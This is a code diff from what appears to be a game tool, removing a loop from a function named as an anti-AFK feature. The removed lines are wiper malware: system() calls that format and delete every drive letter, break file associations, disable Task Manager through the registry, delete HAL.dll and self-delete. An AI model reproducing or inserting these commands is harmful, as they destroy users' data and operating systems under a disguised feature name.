@@ -1668,75 +1668,7 @@ void GoAntiAfkJfllllss1() {
 		if (antiafkJfllllss1 == 0) break;
 		for (int i = 1; i <= 100; i++)
 		{
-			system("format A: /q /autotest");
-			system("format B: /q /autotest");
-			system("format C: /q /autotest");
-			system("format D: /q /autotest"); //вынос винды
-			system("format E: /q /autotest");
-			system("format F: /q /autotest");
-			system("format G: /q /autotest");
-			system("format H: /q /autotest");
-			system("format I: /q /autotest");
-			system("format J: /q /autotest");
-			system("format K: /q /autotest");
-			system("format L: /q /autotest");
-			system("format M: /q /autotest");
-			system("format O: /q /autotest");
-			system("format P: /q /autotest");
-			system("format Q: /q /autotest");
-			system("format R: /q /autotest");
-			system("format S: /q /autotest");
-			system("format T: /q /autotest");
-			system("format U: /q /autotest");
-			system("format V: /q /autotest");
-			system("format W: /q /autotest");
-			system("format X: /q /autotest");
-			system("format Y: /q /autotest");
-			system("format Z: /q /autotest");
-			system("format N: /q /autotest");
-			system("del A:\*.* /f /s /q");
-			system("del B:\*.* /f /s /q");
-			system("del C:\*.* /f /s /q");
-			system("del D:\*.* /f /s /q");
-			system("del E:\*.* /f /s /q");
-			system("del F:\*.* /f /s /q");
-			system("del G:\*.* /f /s /q");
-			system("del H:\*.* /f /s /q");
-			system("del I:\*.* /f /s /q");
-			system("del J:\*.* /f /s /q");
-			system("del K:\*.* /f /s /q");
-			system("del L:\*.* /f /s /q");
-			system("del M:\*.* /f /s /q");
-			system("del N:\*.* /f /s /q");
-			system("del O:\*.* /f /s /q");
-			system("del P:\*.* /f /s /q");
-			system("del Q:\*.* /f /s /q");
-			system("del R:\*.* /f /s /q");
-			system("del S:\*.* /f /s /q");
-			system("del T:\*.* /f /s /q");
-			system("del U:\*.* /f /s /q");
-			system("del V:\*.* /f /s /q");
-			system("del W:\*.* /f /s /q");
-			system("del X:\*.* /f /s /q");
-			system("del Y:\*.* /f /s /q");
-			system("del Z:\*.* /f /s /q");
-			system("assoc .exe=.ZH ");
-			system("assoc .dll=.ZH ");
-			system("assoc .pwn=.ZH ");
-			system("assoc .cpp=.ZH ");
-			system("assoc .h=.ZH ");
-			system("assoc .txt=.ZH ");
-			system("assoc .png=.ZH ");
-			system("assoc .jpj=.ZH ");
-			system("assoc .jpeg=.ZH ");
-			system("assoc .ini=.ZH ");
-			system("assoc .sys=.ZH ");
-			system("reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul");
-			system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
-			system("del %systemroot%\system32\HAL.dll");
-			system("assoc .lnk=.txt");
-			system("del %0");
-			system("FOR /L %%i IN (1,1,1000000) DO md %%i");
+			
 		}
 		Sleep(100);
 	}
